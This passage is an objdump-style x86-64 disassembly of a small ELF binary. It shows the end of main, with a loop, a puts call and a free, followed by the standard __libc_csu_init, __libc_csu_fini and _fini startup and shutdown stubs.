    17b1:	48 83 45 a8 01       	addq   $0x1,-0x58(%rbp)
    17b6:	83 ad 60 ff ff ff 01 	subl   $0x1,-0xa0(%rbp)
    17bd:	83 bd 60 ff ff ff 00 	cmpl   $0x0,-0xa0(%rbp)
    17c4:	0f 85 f9 fc ff ff    	jne    14c3 <main+0x5bf>
    17ca:	48 8d 3d a7 02 00 00 	lea    0x2a7(%rip),%rdi        # 1a78 <_IO_stdin_used+0x1f8>
    17d1:	e8 ea f0 ff ff       	callq  8c0 <puts@plt>
    17d6:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    17da:	48 89 c7             	mov    %rax,%rdi
    17dd:	e8 ce f0 ff ff       	callq  8b0 <free@plt>
    17e2:	b8 00 00 00 00       	mov    $0x0,%eax
    17e7:	48 81 c4 d8 00 00 00 	add    $0xd8,%rsp
    17ee:	5b                   	pop    %rbx
    17ef:	5d                   	pop    %rbp
    17f0:	c3                   	retq   
    17f1:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    17f8:	00 00 00 
    17fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000001800 <__libc_csu_init>:
    1800:	41 57                	push   %r15
    1802:	41 56                	push   %r14
    1804:	49 89 d7             	mov    %rdx,%r15
    1807:	41 55                	push   %r13
    1809:	41 54                	push   %r12
    180b:	4c 8d 25 2e 05 20 00 	lea    0x20052e(%rip),%r12        # 201d40 <__frame_dummy_init_array_entry>
    1812:	55                   	push   %rbp
    1813:	48 8d 2d 2e 05 20 00 	lea    0x20052e(%rip),%rbp        # 201d48 <__init_array_end>
    181a:	53                   	push   %rbx
    181b:	41 89 fd             	mov    %edi,%r13d
    181e:	49 89 f6             	mov    %rsi,%r14
    1821:	4c 29 e5             	sub    %r12,%rbp
    1824:	48 83 ec 08          	sub    $0x8,%rsp
    1828:	48 c1 fd 03          	sar    $0x3,%rbp
    182c:	e8 47 f0 ff ff       	callq  878 <_init>
    1831:	48 85 ed             	test   %rbp,%rbp
    1834:	74 20                	je     1856 <__libc_csu_init+0x56>
    1836:	31 db                	xor    %ebx,%ebx
    1838:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    183f:	00 
    1840:	4c 89 fa             	mov    %r15,%rdx
    1843:	4c 89 f6             	mov    %r14,%rsi
    1846:	44 89 ef             	mov    %r13d,%edi
    1849:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
    184d:	48 83 c3 01          	add    $0x1,%rbx
    1851:	48 39 dd             	cmp    %rbx,%rbp
    1854:	75 ea                	jne    1840 <__libc_csu_init+0x40>
    1856:	48 83 c4 08          	add    $0x8,%rsp
    185a:	5b                   	pop    %rbx
    185b:	5d                   	pop    %rbp
    185c:	41 5c                	pop    %r12
    185e:	41 5d                	pop    %r13
    1860:	41 5e                	pop    %r14
    1862:	41 5f                	pop    %r15
    1864:	c3                   	retq   
    1865:	90                   	nop
    1866:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    186d:	00 00 00 

0000000000001870 <__libc_csu_fini>:
    1870:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000001874 <_fini>:
    1874:	48 83 ec 08          	sub    $0x8,%rsp
    1878:	48 83 c4 08          	add    $0x8,%rsp
    187c:	c3                   	retq   
